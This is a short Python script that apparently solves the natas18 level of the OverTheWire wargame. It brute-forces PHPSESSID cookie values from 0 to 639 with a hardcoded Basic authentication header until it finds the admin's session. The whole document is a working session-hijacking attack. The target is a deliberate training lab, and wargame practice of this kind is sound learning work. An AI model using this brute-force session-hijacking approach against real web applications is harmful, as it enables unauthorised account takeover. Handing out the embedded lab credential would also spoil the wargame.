import requests

print("Trying to bruteforce session id to find admin session")
url = 'http://natas18.natas.labs.overthewire.org/index.php'
login = { 'username':'admin', 'password':'1234'}
print("Session id: ",end='')
for i in range(640):
    header = { 'Cookie':'PHPSESSID={0}'.format(str(i)), 'Authorization':'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' }
    print("{0}..".format(str(i)),end='',flush=True)
    r = requests.post(url, params=login, headers=header)
    if 'You are an admin' in r.text:
        print("Admin session found {0}".format(str(i)))
        print(r.text)
        break

print("Success???")
    